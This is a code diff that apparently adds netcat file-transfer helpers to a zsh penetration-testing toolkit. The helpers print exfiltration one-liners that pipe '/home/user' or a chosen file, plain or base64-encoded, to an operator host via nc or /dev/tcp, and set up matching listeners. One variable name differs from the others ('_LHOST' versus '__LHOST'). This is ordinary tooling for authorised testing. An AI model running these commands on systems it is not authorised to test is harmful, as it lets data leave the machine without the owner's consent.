@@ -45,3 +45,24 @@ qq-srv-updog-auto() {
     updog -p 443 --ssl -d /srv
 }
 alias srv-up
+
+qq-srv-nc-tar() {
+    qq-vars-set-lhost
+    local port && read "port?$fg[cyan]PORT:$reset_color "
+    __info "tar cfv - /home/user | nc ${_LHOST} ${port}"
+    print -z "nc -nvlp ${port} | tar xfv -"
+}
+
+qq-srv-nc-file() {
+    qq-vars-set-lhost
+    local port && read "port?$fg[cyan]PORT:$reset_color "
+    __info "cat FILE > /dev/tcp/${__LHOST}/${port}"
+    print -z "nc -nvlp ${port} -w 5 > incoming.txt"  
+}
+
+qq-srv-nc-b64() {
+    qq-vars-set-lhost
+    local port && read "port?$fg[cyan]PORT:$reset_color "
+    __info "openssl base64 -in FILE > /dev/tcp/${__LHOST}/${port}"
+    print -z "nc -nvlp ${port} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
+}
